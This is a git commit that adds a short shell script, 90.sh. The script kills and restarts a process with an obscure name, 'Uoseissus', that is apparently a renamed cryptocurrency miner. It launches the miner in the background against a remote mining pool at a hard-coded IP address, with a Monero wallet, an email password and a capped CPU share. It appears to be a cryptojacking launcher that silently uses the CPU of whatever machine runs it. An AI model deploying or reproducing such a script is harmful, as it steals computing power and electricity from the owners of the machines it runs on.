a73a983e2b5b032dde4831f002a5e302d180f8db
servicemi <52180716+servicemi@users.noreply.github.com>
2019-07-08 21:27:47 +0100

    Add files via upload

---
+++ 90.sh
@@ -0,0 +1,3 @@
+pkill Uoseissus
+sleep 7
+Uoseissus -o 109.94.208.135:2445 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=x:obo121212@gmail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
